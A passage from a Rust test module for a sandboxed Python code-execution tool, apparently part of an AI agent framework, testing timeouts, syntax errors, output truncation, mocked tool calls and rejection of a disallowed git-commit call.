            ..Default::default()
        };

        let script = r#"
import astra_tools
result = astra_tools.read_file("test.txt")
print(result)
"#;
        let result = execute_code(script, &config, &executor).await;
        assert!(result.is_ok(), "got: {:?}", result);
        assert!(result.unwrap().contains("content of test.txt"));
    }

    #[tokio::test]
    #[cfg_attr(not(feature = "python_tests"), ignore)]
    async fn test_execute_script_syntax_error() {
        if !python3_available() {
            eprintln!("Skipping: python3 not available");
            return;
        }
        let executor = MockToolExecutor::new();
        let config = CodeExecConfig {
            timeout: Duration::from_secs(10),
            ..Default::default()
        };

        let script = r#"def foo(
    # missing closing paren
print("unreachable")
"#;
        let result = execute_code(script, &config, &executor).await;
        assert!(result.is_err());
        match result.unwrap_err() {
            CodeExecError::SyntaxError(msg) => {
                assert!(msg.contains("SyntaxError"));
            }
            other => panic!("Expected SyntaxError, got: {other:?}"),
        }
    }

    #[tokio::test]
    #[cfg_attr(not(feature = "python_tests"), ignore)]
    async fn test_execute_script_timeout() {
        if !python3_available() {
            eprintln!("Skipping: python3 not available");
            return;
        }
        let executor = MockToolExecutor::new();
        let config = CodeExecConfig {
            timeout: Duration::from_millis(500),
            ..Default::default()
        };

        let script = r#"
import time
time.sleep(10)
print("should not reach here")
"#;
        let result = execute_code(script, &config, &executor).await;
        assert!(result.is_err());
        assert!(matches!(result.unwrap_err(), CodeExecError::Timeout(_)));
    }

    #[tokio::test]
    #[cfg_attr(not(feature = "python_tests"), ignore)]
    async fn test_execute_script_stdout_overflow() {
        if !python3_available() {
            eprintln!("Skipping: python3 not available");
            return;
        }
        let executor = MockToolExecutor::new();
        let config = CodeExecConfig {
            timeout: Duration::from_secs(10),
            max_stdout_bytes: 100,
            ..Default::default()
        };

        let script = r#"
# Print way more than 100 bytes
for i in range(100):
    print(f"line {i}: " + "x" * 50)
"#;
        let result = execute_code(script, &config, &executor).await;
        assert!(result.is_ok(), "got: {:?}", result);
        let output = result.unwrap();
        // Output should contain truncation notice
        assert!(
            output.contains("[stdout truncated"),
            "expected truncation notice, got: {output}"
        );
    }

    #[tokio::test]
    #[cfg_attr(not(feature = "python_tests"), ignore)]
    async fn test_execute_script_disallowed_tool_error() {
        if !python3_available() {
            eprintln!("Skipping: python3 not available");
            return;
        }
        let executor = MockToolExecutor::new();
        let config = CodeExecConfig {
            timeout: Duration::from_secs(10),
            ..Default::default()
        };

        let script = r#"
import astra_tools
try:
    astra_tools._rpc_call("git_commit", {"message": "evil"})
    print("ERROR: should have raised")
except RuntimeError as e:
    print(f"Correctly rejected: {e}")
"#;
        let result = execute_code(script, &config, &executor).await;
        assert!(result.is_ok(), "got: {:?}", result);
        let output = result.unwrap();
        assert!(output.contains("Correctly rejected"), "got: {output}");
        assert!(output.contains("not allowed"));
    }

    #[tokio::test]
    #[cfg_attr(not(feature = "python_tests"), ignore)]
    async fn test_execute_script_multiple_tool_calls() {
        if !python3_available() {
            eprintln!("Skipping: python3 not available");
            return;
        }
        let executor = MockToolExecutor::new();
        let config = CodeExecConfig {
            timeout: Duration::from_secs(10),
            ..Default::default()
        };

        let script = r#"
import astra_tools

r1 = astra_tools.read_file("a.txt")
r2 = astra_tools.read_file("b.txt")
files = astra_tools.list_dir(".")
print(f"r1={r1}")
print(f"r2={r2}")
print(f"files={files}")
"#;
        let result = execute_code(script, &config, &executor).await;
        assert!(result.is_ok(), "got: {:?}", result);
        let output = result.unwrap();
        assert!(output.contains("r1=content of a.txt"));
        assert!(output.contains("r2=content of b.txt"));
        assert!(output.contains("files=file1.txt"));
    }

    // ── Test: handle_execute_code argument parsing ────────────────────────

    #[tokio::test]
    async fn test_handle_execute_code_missing_script() {
        let executor = MockToolExecutor::new();
        let result = handle_execute_code(&json!({}), &executor).await;
        assert!(result.is_error);
        assert!(result.output.contains("Missing 'script'"));
    }

    #[tokio::test]
    #[cfg_attr(not(feature = "python_tests"), ignore)]
    async fn test_handle_execute_code_with_custom_timeout() {
        if !python3_available() {
            return;
        }
        let executor = MockToolExecutor::new();
        let args = json!({
            "script": "print('ok')",
            "timeout": 5
        });
        let result = handle_execute_code(&args, &executor).await;
        assert!(!result.is_error, "got: {}", result.output);
        assert!(result.output.contains("ok"));
    }

    // ── Test: python3_available helper ────────────────────────────────────

    #[test]
    fn test_python3_available_returns_bool() {
        // Just verify it doesn't panic — the result depends on the system
        let _ = python3_available();
    }
}
